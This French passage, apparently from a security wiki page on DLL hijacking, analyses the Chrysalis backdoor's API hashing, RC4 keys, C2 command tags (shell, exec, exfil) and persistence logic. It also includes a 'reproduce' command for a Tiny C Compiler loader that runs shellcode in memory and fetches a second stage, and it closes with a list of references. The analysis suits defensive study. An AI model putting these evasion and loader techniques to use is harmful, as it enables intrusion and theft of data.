- Pour éviter un IAT, le loader résout les APIs en hachant les noms d'exports en utilisant **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, puis en appliquant une avalanche de type Murmur (**0x85EBCA6B**) et en comparant aux hashes cibles salés.

Shellcode principal (Chrysalis)
- Déchiffre un module principal de type PE en répétant add/XOR/sub avec la clé `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour terminer la résolution des imports.
- Reconstruit les chaînes de noms de DLL à l'exécution via des transformations bit-rotate/XOR par caractère, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un second resolver qui parcourt la **PEB → InMemoryOrderModuleList**, analyse chaque table d'exports en blocs de 4 octets avec un mélange de type Murmur, et ne recourt à `GetProcAddress` que si le hash n'est pas trouvé.

Configuration embarquée & C2
- La config se trouve à l'intérieur du fichier `BluetoothService` déposé à **offset 0x30808** (taille **0x980**) et est décryptée RC4 avec la clé `qwhvb^435h&*7`, révélant l'URL C2 et le User-Agent.
- Les beacons construisent un profil d'hôte délimité par des points, préfixent la balise `4Q`, puis encryptent RC4 avec la clé `vAuig34%^325hGV` avant `HttpSendRequestA` via HTTPS. Les réponses sont décryptées RC4 et dispatchées par un switch de tags (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Le mode d'exécution est conditionné par les args CLI : pas d'args = installer la persistence (service/Run key) pointant vers `-i` ; `-i` relance le binaire avec `-k` ; `-k` saute l'installation et exécute le payload.

Loader alternatif observé
- La même intrusion a déposé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à côté. Le source C fourni par l'attaquant intégrait du shellcode, a été compilé et exécuté en mémoire sans toucher le disque avec un PE. Reproduire avec :
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Cette étape TCC-based compile-and-run a importé `Wininet.dll` à l'exécution et a récupéré un second-stage shellcode depuis une URL codée en dur, donnant un loader flexible qui se fait passer pour un compiler run.

## Références

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
